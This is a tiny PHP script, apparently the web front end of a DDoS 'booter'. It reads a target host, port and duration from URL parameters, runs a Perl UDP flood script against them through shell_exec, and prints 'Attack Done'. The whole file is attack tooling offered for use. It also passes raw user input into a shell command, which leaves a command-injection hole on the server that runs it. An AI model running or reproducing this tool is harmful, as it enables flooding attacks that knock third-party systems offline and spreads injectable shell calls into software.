<?php
//Made by menace
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];

if ($host == null)
{

echo "Enter a host";

}
else{
shell_exec("perl /var/www/udp.pl $host $port 0 $time");

echo "Attack Done";
}
?>
